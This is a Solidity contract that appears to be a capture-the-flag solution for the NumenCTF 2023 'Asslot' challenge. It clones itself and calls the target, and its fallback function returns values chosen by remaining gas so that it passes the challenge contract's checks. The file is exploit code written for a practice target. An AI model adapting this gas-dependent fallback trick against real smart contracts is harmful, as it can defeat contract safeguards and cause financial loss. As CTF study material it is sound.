// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "src/NumenCTF_2023/Asslot/Asslot.sol";
import "@openzeppelin/contracts/proxy/Clones.sol";
import "forge-std/console2.sol";

contract AsslotAttack {
    address public proxyAddress;

    function clone() public {
        proxyAddress = Clones.clone(address(this));
    }

    function solve(address target) public {
        Asslot a = Asslot(target);
        a.f00000000_bvvvdlt();
    }

    fallback(bytes calldata /*data*/) external returns(bytes memory retVal) {
        if (gasleft() < 273000) {
            console2.log(gasleft());
            return abi.encode(3);
        }
        else if (gasleft() < 274000) {
            console2.log(gasleft());
            return abi.encode(2);
        }
        else if (gasleft() < 277000) {
            console2.log(gasleft());
            return abi.encode(1);
        }
        else {
            console2.log(gasleft());
            return abi.encode(0);
        }
    }

}


